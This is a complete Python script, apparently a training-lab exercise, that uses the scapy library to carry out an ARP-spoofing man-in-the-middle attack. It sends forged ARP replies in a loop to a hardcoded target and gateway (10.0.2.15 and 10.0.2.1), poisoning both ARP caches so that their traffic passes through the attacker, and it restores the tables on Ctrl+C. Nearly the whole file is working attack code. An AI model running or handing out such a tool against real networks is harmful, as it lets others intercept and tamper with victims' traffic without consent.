#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    mac_target = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):
    mac_destination = get_mac(destination_ip)
    mac_source = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=mac_destination, psrc=source_ip, hwsrc=mac_source)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    packet_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        packet_count = packet_count + 2
        print("\r[+]Packet Send : " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP Tables ... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)